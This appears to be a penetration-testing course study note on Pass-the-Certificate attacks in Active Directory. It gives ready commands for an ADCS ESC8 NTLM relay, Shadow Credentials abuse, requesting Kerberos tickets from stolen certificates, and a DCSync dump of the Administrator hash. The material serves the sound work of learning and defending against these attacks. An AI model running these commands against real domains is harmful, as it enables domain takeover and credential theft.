- Uses an X.509 certificate instead of a password/hash/ticket to get a TGT, via PKINIT (the part of Kerberos that supports cert-based login, e.g. smart cards)
- Comes up with 2 attack paths: AD CS (certificate authority misconfig) and Shadow Credentials (abusing a specific AD write permission)

---
## Path 1: ADCS NTLM Relay (ESC8)
- If a Certificate Authority has web enrollment over HTTP, we can relay an incoming auth attempt into getting a cert issued
```bash
impacket-ntlmrelayx -t http://<ca-ip>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```
- Then force a machine account to auth to us (e.g. printer bug, needs Print Spooler running on target):
```bash
python3 printerbug.py DOMAIN/user:pass@<target-ip> <our-ip>
```
- If it works, ntlmrelayx saves a `.pfx` certificate file for that machine account

---
## Path 2: Shadow Credentials
- If we have write access to a user's `msDS-KeyCredentialLink` attribute (BloodHound calls this edge `AddKeyCredentialLink`), we can add our own cert as a valid login method for them
```bash
pywhisker --dc-ip <ip> -d DOMAIN -u ourUser -p ourPass --target victimUser --action add
```
- Outputs a `.pfx` file + its password

---
## Using the certificate (either path)
```bash
python3 gettgtpkinit.py -cert-pfx cert.pfx -dc-ip <ip> 'DOMAIN/victimuser' /tmp/victim.ccache
export KRB5CCNAME=/tmp/victim.ccache
```
- Now we're back to a normal [[Pass the Ticket (Linux)]] situation, use the ticket like any other
- If the victim was a Domain Controller's own machine account, this is a path to DCSync (dump any user's hash straight from AD):
```bash
impacket-secretsdump -k -no-pass -dc-ip <ip> -just-dc-user Administrator 'DOMAIN/DC01$'@dc01.domain
```

---
## If PKINIT doesn't work
- Some KDCs won't accept the cert for login directly, **PassTheCert** can still use it to auth to LDAPS instead (change passwords, grant DCSync rights) — worth knowing exists, covered in more depth in the ADCS module later